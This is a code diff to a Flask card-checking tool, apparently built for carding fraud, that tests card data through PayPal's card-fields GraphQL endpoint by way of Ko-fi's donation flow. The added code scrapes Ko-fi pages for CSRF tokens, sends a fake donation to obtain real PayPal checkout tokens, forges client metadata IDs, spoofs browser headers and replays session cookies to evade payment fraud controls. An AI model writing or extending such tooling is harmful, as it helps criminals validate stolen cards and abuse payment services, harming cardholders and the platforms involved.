@@ -5,20 +5,118 @@ import random
 import string
 import json
 import os
+from bs4 import BeautifulSoup
+import re
+import uuid
 
 app = Flask(__name__)
 
 # Global session for requests
 session = requests.Session()
 
-def generate_kofi_token():
-    """Generate a Ko-fi style PayPal token"""
-    # Ko-fi tokens follow pattern: 8 digits + 2 letters + 8 digits + 1 letter
-    digits1 = ''.join(random.choices('0123456789', k=8))
-    letters1 = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=2))
-    digits2 = ''.join(random.choices('0123456789', k=8))
-    letter2 = random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
-    return f"{digits1}{letters1}{digits2}{letter2}"
+def get_real_kofi_paypal_token():
+    """Get a real PayPal token by initiating Ko-fi donation flow"""
+    try:
+        # Create a fresh session for Ko-fi
+        kofi_session = requests.Session()
+        
+        # Step 1: Visit Ko-fi donation page
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Referer': 'https://ko-fi.com/',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1'
+        }
+        
+        # Visit Ko-fi support page
+        response = kofi_session.get('https://ko-fi.com/supportkofi', headers=headers)
+        if response.status_code != 200:
+            return None, None
+            
+        # Step 2: Parse page for PayPal payment form
+        soup = BeautifulSoup(response.text, 'html.parser')
+        
+        # Look for PayPal payment button or form
+        paypal_form = soup.find('form', {'action': lambda x: x and 'paypal' in x.lower()})
+        if not paypal_form:
+            # Try to find PayPal button
+            paypal_button = soup.find('button', {'class': lambda x: x and 'paypal' in str(x).lower()})
+            if not paypal_button:
+                return None, None
+        
+        # Step 3: Try to initiate PayPal checkout
+        # Look for donation amount buttons (usually $3, $5, $10)
+        amount_buttons = soup.find_all('button', {'data-amount': True})
+        if not amount_buttons:
+            # Try alternative selectors
+            amount_buttons = soup.find_all('input', {'name': 'amount'})
+            
+        # Use smallest amount available
+        donation_amount = "3"  # Default $3
+        if amount_buttons:
+            amounts = []
+            for btn in amount_buttons:
+                amount = btn.get('data-amount') or btn.get('value', '3')
+                try:
+                    amounts.append(int(amount))
+                except:
+                    continue
+            if amounts:
+                donation_amount = str(min(amounts))
+        
+        # Step 4: Initiate PayPal payment
+        # This typically involves POSTing to Ko-fi's payment endpoint
+        payment_data = {
+            'amount': donation_amount,
+            'payment_method': 'paypal',
+            'message': 'Thanks for the coffee!'
+        }
+        
+        # Look for CSRF token or verification token
+        csrf_token = None
+        csrf_input = soup.find('input', {'name': re.compile(r'.*token.*', re.I)})
+        if csrf_input:
+            csrf_token = csrf_input.get('value')
+            payment_data[csrf_input.get('name')] = csrf_token
+        
+        # Make payment initiation request
+        payment_response = kofi_session.post(
+            'https://ko-fi.com/api/donations/create',
+            data=payment_data,
+            headers={
+                **headers,
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'X-Requested-With': 'XMLHttpRequest'
+            }
+        )
+        
+        if payment_response.status_code == 200:
+            try:
+                payment_result = payment_response.json()
+                paypal_url = payment_result.get('paypal_url') or payment_result.get('redirect_url')
+                if paypal_url and 'paypal.com' in paypal_url:
+                    # Extract token from PayPal URL
+                    token_match = re.search(r'token=([A-Z0-9]+)', paypal_url)
+                    if token_match:
+                        return token_match.group(1), kofi_session.cookies
+            except:
+                pass
+        
+        return None, None
+        
+    except Exception as e:
+        print(f"Ko-fi token error: {e}")
+        return None, None
+
+def generate_backup_token():
+    """Generate a backup token when Ko-fi scraping fails"""
+    # Use a more realistic token pattern based on actual PayPal tokens
+    import uuid
+    token_base = uuid.uuid4().hex[:17].upper()
+    return f"{token_base}X"
 
 def get_random_customer():
     """Generate random customer details"""
@@ -61,19 +159,26 @@ def check_card_kofi_paypal(cc_data):
         # Generate random customer
         customer = get_random_customer()
         
-        # Generate Ko-fi PayPal token
-        kofi_token = generate_kofi_token()
+        # Get real Ko-fi PayPal token
+        kofi_token, kofi_cookies = get_real_kofi_paypal_token()
         
-        # PayPal GraphQL headers (from captured Ko-fi flow)
+        # If we can't get a real token, use backup
+        if not kofi_token:
+            kofi_token = generate_backup_token()
+        
+        # Generate unique client metadata ID
+        client_metadata_id = f"uid_{uuid.uuid4().hex[:10]}_{random.randint(1000000000, 9999999999)}"
+        
+        # PayPal GraphQL headers (from captured Ko-fi flow) with real token
         headers = {
             'accept': '*/*',
             'accept-encoding': 'gzip, deflate, br, zstd',
             'accept-language': 'en-US,en;q=0.6',
             'content-type': 'application/json',
             'origin': 'https://www.paypal.com',
-            'paypal-client-context': kofi_token,
-            'paypal-client-metadata-id': kofi_token,
-            'referer': f'https://www.paypal.com/smart/card-fields?sessionID=uid_{kofi_token.lower()}&buttonSessionID=uid_{kofi_token.lower()}&locale.x=en_US&commit=true&style.submitButton.display=true&hasShippingCallback=false&env=production&country.x=US&token={kofi_token}',
+            'paypal-client-context': client_metadata_id,
+            'paypal-client-metadata-id': client_metadata_id,
+            'referer': f'https://www.paypal.com/smart/card-fields?sessionID={client_metadata_id}&buttonSessionID={client_metadata_id}&locale.x=en_US&commit=true&style.submitButton.display=true&hasShippingCallback=false&env=production&country.x=US&token={kofi_token}',
             'sec-ch-ua': '"Not;A=Brand";v="99", "Brave";v="139", "Chromium";v="139"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
@@ -84,6 +189,11 @@ def check_card_kofi_paypal(cc_data):
             'x-app-name': 'standardcardfields',
             'x-country': 'US'
         }
+        
+        # Add Ko-fi cookies if available
+        if kofi_cookies:
+            cookie_header = '; '.join([f"{cookie.name}={cookie.value}" for cookie in kofi_cookies])
+            headers['cookie'] = cookie_header
         
         # PayPal GraphQL mutation payload (exact structure from Ko-fi)
         payload = {
